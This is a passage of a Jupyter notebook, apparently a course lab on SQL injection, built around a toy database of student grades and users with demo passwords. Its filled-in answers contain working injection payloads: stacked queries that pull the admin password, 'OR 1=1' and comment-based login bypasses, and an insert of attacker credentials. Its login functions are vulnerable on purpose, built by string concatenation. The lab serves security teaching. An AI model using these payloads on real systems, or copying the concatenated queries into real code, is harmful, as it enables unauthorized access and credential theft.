    "    INSERT INTO transcripts VALUES (1, 'Alice', 'cs161', 'A');\n",
    "    INSERT INTO transcripts VALUES (1, 'Alice', 'cs162', 'A-');\n",
    "    INSERT INTO transcripts VALUES (2, 'Bob', 'cs161', 'A-');\n",
    "    INSERT INTO transcripts VALUES (2, 'Bob', 'cs162', 'A');\n",
    "    INSERT INTO transcripts VALUES (3, 'Carlo', 'cs161', 'B-');\n",
    "    INSERT INTO transcripts VALUES (4, 'David', 'cs161', 'B');\n",
    "    INSERT INTO transcripts VALUES (4, 'David', 'cs61a', 'A');\n",
    "    INSERT INTO transcripts VALUES (5, 'Eve', 'cs161', 'A');\n",
    "    INSERT INTO transcripts VALUES (6, 'Frank', 'cs161', 'A');\n",
    "    INSERT INTO transcripts VALUES (7, 'Gina', 'cs161', 'A-');\n",
    "    INSERT INTO transcripts VALUES (8, 'Harika', 'cs161', 'A');\n",
    "    INSERT INTO transcripts VALUES (8, 'Harika', 'cs61a', 'B');\n",
    "    INSERT INTO transcripts VALUES (9, 'Isabelle', 'cs161', 'B-');\n",
    "    INSERT INTO transcripts VALUES (10, 'Jack', 'cs161', 'B');\n",
    "    INSERT INTO transcripts VALUES (11, 'Kian', 'cs161', 'A');\n",
    "    INSERT INTO transcripts VALUES (11, 'Kian', 'cs61a', 'A-');\n",
    "    INSERT INTO transcripts VALUES (12, 'Lily', 'cs161', 'B');\n",
    "    \n",
    "    INSERT INTO users VALUES ('Nova', '83@Ln^Yck_R@z2x#');\n",
    "    INSERT INTO users VALUES ('manager', 'LbJHaRRm+98tF5P$');\n",
    "    INSERT INTO users VALUES ('admin', 'cLzvCw9kCxYg?AdE');\n",
    "    \"\"\");"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now we can collect data from the tables using the <mark>Select</mark> SQL command. Below, we select the records from the transcript table in the order of grades."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT * FROM transcripts ORDER BY grade\n",
      "[(1, 'Alice', 'cs161', 'A'), (2, 'Bob', 'cs162', 'A'), (4, 'David', 'cs61a', 'A'), (5, 'Eve', 'cs161', 'A'), (6, 'Frank', 'cs161', 'A'), (8, 'Harika', 'cs161', 'A'), (11, 'Kian', 'cs161', 'A'), (1, 'Alice', 'cs162', 'A-'), (2, 'Bob', 'cs161', 'A-'), (7, 'Gina', 'cs161', 'A-'), (11, 'Kian', 'cs61a', 'A-'), (4, 'David', 'cs161', 'B'), (8, 'Harika', 'cs61a', 'B'), (10, 'Jack', 'cs161', 'B'), (12, 'Lily', 'cs161', 'B'), (3, 'Carlo', 'cs161', 'B-'), (9, 'Isabelle', 'cs161', 'B-')]\n"
     ]
    }
   ],
   "source": [
    "res = exe_sql_script('SELECT * FROM transcripts ORDER BY grade');\n",
    "print(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Warmup: \n",
    "1. Please provide a query that selects all records from the transcript table, ordered by <b>course</b>."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [],
   "source": [
    "query = 'SELECT * FROM transcripts ORDER BY course'; # Your answer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 353,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT * FROM transcripts ORDER BY course\n",
      "[(1, 'Alice', 'cs161', 'A'), (2, 'Bob', 'cs161', 'A-'), (3, 'Carlo', 'cs161', 'B-'), (4, 'David', 'cs161', 'B'), (5, 'Eve', 'cs161', 'A'), (6, 'Frank', 'cs161', 'A'), (7, 'Gina', 'cs161', 'A-'), (8, 'Harika', 'cs161', 'A'), (9, 'Isabelle', 'cs161', 'B-'), (10, 'Jack', 'cs161', 'B'), (11, 'Kian', 'cs161', 'A'), (12, 'Lily', 'cs161', 'B'), (1, 'Alice', 'cs162', 'A-'), (2, 'Bob', 'cs162', 'A'), (4, 'David', 'cs61a', 'A'), (8, 'Harika', 'cs61a', 'B'), (11, 'Kian', 'cs61a', 'A-')]\n"
     ]
    }
   ],
   "source": [
    "# Test your answer\n",
    "res = exe_sql_script(query);\n",
    "print(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2. Please provide a query that selects all <b>grades</b> from the transcript table where the course is <b>cs161</b>."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [],
   "source": [
    "query = \"SELECT grade FROM transcripts WHERE course = 'cs161'\"; # Your answer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT grade FROM transcripts WHERE course = 'cs161'\n",
      "[('A',), ('A-',), ('B-',), ('B',), ('A',), ('A',), ('A-',), ('A',), ('B-',), ('B',), ('A',), ('B',)]\n"
     ]
    }
   ],
   "source": [
    "# Test your answer\n",
    "res = exe_sql_script(query);\n",
    "print(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Practice\n",
    "In the above examples, users can provide the full query string for accessing the database. In the most of real-world applications, however, users usually can only provide a small part of query string, which will be concatenated with other strings provided by the application. However, this still allows users to perform an SQL injection attack.\n",
    "\n",
    "In the following questions, you are asked to fill in the <code>input</code> variable, which will be used to construct the <code>query</code> string later.\n",
    "### Question 1.\n",
    "Please fill in the <code>input</code> variable so that the SQL command will select all the records in the transcripts table where the course is <b>cs61a</b>. You can execute the following code block to see if your answer is correct."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [],
   "source": [
    "input = 'cs61a' # Your answer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT * FROM transcripts WHERE course = 'cs61a'\n",
      "[(4, 'David', 'cs61a', 'A'), (8, 'Harika', 'cs61a', 'B'), (11, 'Kian', 'cs61a', 'A-')]\n"
     ]
    }
   ],
   "source": [
    "# Test your answer\n",
    "query = \"SELECT * FROM transcripts WHERE course = '\" + input + \"'\";\n",
    "res = exe_sql_script(query);\n",
    "print(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Question 2. \n",
    "Now we can see how SQL injection works. It seems users can only specify the course name; however, some input strings may result in undesirable SQL commands.\n",
    "\n",
    "Please fill in the <code>input</code> variable so that the SQL command will select the <b>password</b> of <b>admin</b> from the <b>users</b> table. You can execute the following codes to see if your answer is correct. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [],
   "source": [
    "input = \"garbage'; SELECT password FROM users WHERE username = 'admin\" # Your answer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT * FROM transcripts WHERE course = 'garbage'\n",
      " SELECT password FROM users WHERE username = 'admin'\n",
      "[('cLzvCw9kCxYg?AdE',)]\n"
     ]
    }
   ],
   "source": [
    "# Test your answer\n",
    "query = \"SELECT * FROM transcripts WHERE course = '\" + input + \"'\";\n",
    "res = exe_sql_script(query);\n",
    "print(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Question 3. \n",
    "Consider the following login function. Given the username and password, it searches the database for any matching records. If (<code>len(select_res) > 0</code>), the login attempt will succeed; otherwise, the login attempt will fail. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [],
   "source": [
    "def login(username, password):\n",
    "    try:\n",
    "        select_res = exe_sql_script(\"SELECT username FROM users WHERE username = '\" + username + \"' AND password = '\" + password +\"'\");\n",
    "    except:\n",
    "        print(\"Failed to execute the sql script!\")\n",
    "    if len(select_res) > 0:\n",
    "        print(\"Login Successfully!\")\n",
    "        print(\"user: \" + username)\n",
    "    else:\n",
    "        print(\"Login Failed!\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Please provide values for the <code>username</code> and <code>password</code> variables to login as <b>admin</b>. You can find out the password of admin in the setup script or question 2. Execute the following <code>login</code> call to see the result."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [],
   "source": [
    "username = \"admin\" # Your answer\n",
    "password = \"cLzvCw9kCxYg?AdE\" # Your answer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT username FROM users WHERE username = 'admin' AND password = 'cLzvCw9kCxYg?AdE'\n",
      "Login Successfully!\n",
      "user: admin\n"
     ]
    }
   ],
   "source": [
    "# Test your answer\n",
    "login(username, password)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Question 4. \n",
    "Suppose the attacker is not a user of this database and does not know the password of any users in the system. Please fill in the <code>username</code> and <code>password</code> variables to login without using passwords of any existing users in the setup script."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [],
   "source": [
    "username = \"admin' OR 1=1; SELECT username FROM users WHERE username = 'admin\" # Your answer\n",
    "password = \"garbage\" # Your answer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT username FROM users WHERE username = 'admin' OR 1=1\n",
      " SELECT username FROM users WHERE username = 'admin' AND password = 'garbage'\n",
      "Login Successfully!\n",
      "user: admin' OR 1=1; SELECT username FROM users WHERE username = 'admin\n"
     ]
    }
   ],
   "source": [
    "# Test your answer\n",
    "login(username, password)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Question 5. \n",
    "Suppose the attacker wants to add their username and password to the database by leveraging the vulnerability in the <code>login</code> function. Please provide values for the <code>username</code> and <code>password</code> variables such that the attacker's credentials: (username) \"attacker\" and (password) \"password123\" are inserted into the users table. You can use the following <code>login</code> call to perform the injection and the second  <code>login</code> call to see if the injection succeeds.  Hint: the first login attempt might fail."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [],
   "source": [
    "username = \"admin\" # Your answer\n",
    "password = \"x'; INSERT INTO users VALUES ('attacker', 'password123');\" # Your answer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT username FROM users WHERE username = 'admin' AND password = 'x'\n",
      " INSERT INTO users VALUES ('attacker', 'password123')\n",
      "'\n",
      "Failed to execute the sql script!\n",
      "Login Failed!\n"
     ]
    }
   ],
   "source": [
    "# Perform the injection\n",
    "login(username, password)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT username FROM users WHERE username = 'attacker' AND password = 'password123'\n",
      "Login Successfully!\n",
      "user: attacker\n"
     ]
    }
   ],
   "source": [
    "# Test your anwser\n",
    "login(\"attacker\", \"password123\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Question 6. \n",
    "The application developer is trying to limit the number of SQL commands used in the login function as a potential defense. The new login function is given below. Please fill in the <code>username</code> and <code>password</code> variables to bypass this defense (Suppose the attacker does not know password of any existing user). Hint: think about how to start a comment in SQL."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [],
   "source": [
    "def login_defense_attempt1(username, password):\n",
    "    select_res = []\n",
    "    try:\n",
    "        print(\"SELECT username FROM users WHERE username = '\" + username + \"' AND password = '\" + password +\"'\");\n",
    "        for row in cur.execute(\"SELECT username FROM users WHERE username = '\" + username + \"' AND password = '\" + password +\"'\"):\n",
    "            select_res.append(row)\n",
    "    except:\n",
    "        print(\"Failed to execute the sql script!\")\n",
    "    if len(select_res) > 0:\n",
    "        print(\"Login Successfully!\")\n",
    "        print(\"user: \" + username)\n",
    "    else:\n",
    "        print(\"Login Failed!\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [],
   "source": [
    "username = \"alice' OR 1=1--\" # Your answer\n",
    "password = \"garbage\" # Your answer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT username FROM users WHERE username = 'alice' OR 1=1--' AND password = 'garbage'\n",
      "Login Successfully!\n",
      "user: alice' OR 1=1--\n"
     ]
    }
   ],
   "source": [
    "# Test your answer\n",
    "login_defense_attempt1(username, password)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Question 7. \n",
    "One way to defend against the attack in the question 6 is to sanitize the query string. For example, we may escape any potential input that could be used in an attack. Escaping a character means will treat characters as part of the string, not actual SQL syntax. Please implement a sanitizer in the following function to escape any potential symbol in the query string. You can test it using your answer in question 6."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [],
   "source": [
    "def login_defense_attempt2(username, password):\n",
    "    query = \"SELECT username FROM users WHERE username = '\" + username + \"' AND password = '\" + password +\"'\";\n",
    "    # -----------------------\n",
    "    # Your answer here\n",
    "    \n",
    "    \n",
    "    # ------------------------\n",
    "    select_res = []\n",
    "    try:\n",
    "        print(query);\n",
    "        for row in cur.execute(\"SELECT username FROM users WHERE username = '\" + username + \"' AND password = '\" + password +\"'\"):\n",
    "            select_res.append(row)\n",
    "    except:\n",
    "        print(\"Failed to execute the sql script!\")\n",
    "    if len(select_res) > 0:\n",
    "        print(\"Login Successfully!\")\n",
    "        print(\"user: \" + username)\n",
    "    else:\n",
    "        print(\"Login Failed!\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [],
   "source": [
    "username = \"alice' OR 1=1--\" # Your answer in question 6\n",
    "password = \"garbage\" # Your answer in question 6"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT username FROM users WHERE username = 'alice' OR 1=1--' AND password = 'garbage'\n",
      "Login Successfully!\n",
      "user: alice' OR 1=1--\n"
     ]
    }
   ],
   "source": [
    "# Test your answer; it is supposed to fail\n",
    "login_defense_attempt2(username, password)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Finish\n",
    "Run the following block of code to stop the database once you are finished."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [],
   "source": [
    "cur.execute(\"DROP TABLE transcripts\")\n",
    "cur.execute(\"DROP TABLE users\")\n",
    "con.commit()\n",
    "con.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "interpreter": {
   "hash": "aee8b7b246df8f9039afb4144a1f6fd8d2ca17a180786b69acc140d282b71a49"
  },
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
